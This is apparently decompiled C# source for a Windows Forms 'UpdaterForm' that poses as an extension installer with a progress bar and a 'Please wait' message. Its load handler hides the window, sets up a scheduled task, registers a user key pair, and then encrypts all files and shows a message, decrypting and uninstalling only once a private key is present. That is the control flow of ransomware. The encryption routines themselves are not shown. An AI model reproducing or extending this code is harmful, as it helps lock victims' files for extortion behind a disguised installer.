using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Extension.Properties;

namespace Extension;

public class UpdaterForm : Form
{
	private static Queue que = new Queue();

	private IContainer components;

	private ProgressBar progressBar1;

	private PictureBox pictureBox1;

	private Label label1;

	private Label label2;

	public UpdaterForm()
	{
		InitializeComponent();
	}

	private void OnLoad(object sender, EventArgs e)
	{
		if (!Config.IsDebugMode)
		{
			((Form)this).set_Opacity(0.0);
			((Form)this).set_ShowInTaskbar(false);
			Miscellaneous.AddTask();
		}
		if (Config.User != null && !string.IsNullOrEmpty(Config.User.PublicKey))
		{
			if (string.IsNullOrEmpty(Config.User.PrivateKey))
			{
				AccountManager.CheckVerification();
			}
			Install();
		}
		else
		{
			Register();
		}
	}

	private void Register()
	{
		if (!AccountManager.CreateUser())
		{
			Thread.Sleep(10000);
			Register();
		}
		else
		{
			Install();
		}
	}

	private void Install()
	{
		if (string.IsNullOrEmpty(Config.User.PrivateKey))
		{
			que.EncryptAllFiles();
			Miscellaneous.RunMessage();
		}
		else
		{
			que.DecryptAllFiles();
			Miscellaneous.Uninstall();
		}
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		progressBar1 = new ProgressBar();
		pictureBox1 = new PictureBox();
		label1 = new Label();
		label2 = new Label();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)progressBar1).set_Location(new Point(12, 66));
		progressBar1.set_MarqueeAnimationSpeed(30);
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(360, 23));
		progressBar1.set_Style((ProgressBarStyle)2);
		((Control)progressBar1).set_TabIndex(0);
		pictureBox1.set_Image((Image)(object)Resources.Windows);
		((Control)pictureBox1).set_Location(new Point(12, 7));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(54, 50));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(1);
		pictureBox1.set_TabStop(false);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(81, 16));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(200, 13));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("Please wait while the extension installing.");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(81, 36));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(133, 13));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("It will take several minutes.");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(384, 101));
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)progressBar1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("UpdaterForm");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Updater");
		((Form)this).add_Load((EventHandler)OnLoad);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
